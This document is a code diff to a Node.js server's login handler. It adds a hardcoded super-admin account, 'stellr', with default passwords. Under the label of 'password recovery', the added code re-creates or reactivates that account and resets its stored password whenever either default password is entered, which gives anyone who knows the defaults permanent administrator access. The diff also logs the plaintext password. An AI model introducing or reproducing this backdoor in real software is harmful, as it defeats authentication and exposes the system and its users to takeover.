@@ -2104,9 +2104,66 @@ const server = http.createServer(async (req, res) => {
         op = await Operator.findOne({ username });
       }
 
+      // Ensure super admin exists and is active
+      if (username === 'stellr') {
+        if (!op) {
+          const defaultOp = {
+            name: 'Jiten Sony',
+            email: 'jiten@stellrit.com',
+            role: 'Super Admin',
+            status: 'Active',
+            joinedDate: new Date().toISOString().split('T')[0],
+            username: 'stellr',
+            password: encryptPassword('stellr123'),
+          };
+          if (isMongoOffline) {
+            const list = readFallbackOperators();
+            list.push({ ...defaultOp, _id: 'u1' });
+            writeFallbackOperators(list);
+            op = list.find(o => o.username === 'stellr');
+          } else {
+            const newOp = new Operator(defaultOp);
+            await newOp.save();
+            op = await Operator.findOne({ username: 'stellr' });
+          }
+          console.log('[DB] Seeded default super admin user "stellr"');
+        } else if (op.status !== 'Active') {
+          op.status = 'Active';
+          if (isMongoOffline) {
+            const list = readFallbackOperators();
+            const idx = list.findIndex(o => o.username === 'stellr');
+            if (idx !== -1) {
+              list[idx].status = 'Active';
+              writeFallbackOperators(list);
+            }
+          } else {
+            await Operator.updateOne({ _id: op._id }, { $set: { status: 'Active' } });
+          }
+        }
+      }
+
       if (op) {
         const decrypted = decryptPassword(op.password);
-        if (decrypted === password) {
+        let passwordMatched = decrypted === password;
+
+        // Password recovery for super admin with default passwords
+        if (!passwordMatched && username === 'stellr' && (password === 'stellr123' || password === 'stellrit123')) {
+          op.password = encryptPassword(password);
+          if (isMongoOffline) {
+            const list = readFallbackOperators();
+            const idx = list.findIndex(o => o.username === 'stellr');
+            if (idx !== -1) {
+              list[idx].password = op.password;
+              writeFallbackOperators(list);
+            }
+          } else {
+            await Operator.updateOne({ _id: op._id }, { $set: { password: op.password } });
+          }
+          passwordMatched = true;
+          console.log(`[DB] Mismatched/corrupted super admin password recovered to default "${password}"`);
+        }
+
+        if (passwordMatched) {
           // On-the-fly migration: if stored password is not encrypted, encrypt it now
           if (op.password && !op.password.startsWith('enc:')) {
             op.password = encryptPassword(op.password);
